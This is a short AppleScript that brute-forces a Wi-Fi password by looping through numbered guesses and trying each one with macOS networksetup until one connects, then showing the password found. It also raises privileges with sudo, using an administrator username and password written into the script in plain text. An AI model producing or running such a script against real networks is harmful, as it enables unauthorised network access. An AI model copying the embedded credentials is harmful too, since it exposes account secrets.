# Change the variables
set BSSID to "1"
set startString to "1"
set computerUsername to "Blurry"
set computerPassword to "L3nzV4pHS2V68p7A"

# Enables Accessibility
do shell script "sudo touch /private/var/db/.AccessibilityAPIEnabled" user name computerUsername password computerPassword with administrator privileges

# Set your desired password range to try
repeat with ink from 100 to 300
	set myPassword to startString & ink
	try
		set error to "none"
		do shell script "networksetup -setairportnetwork" & space & quoted form of BSSID & space & quoted form of myPassword with administrator privileges
	on error errStr
		set error to errStr
	end try
	if error = "none" then
		display alert "Password is: " & myPassword
		exit repeat
	end if
end repeat
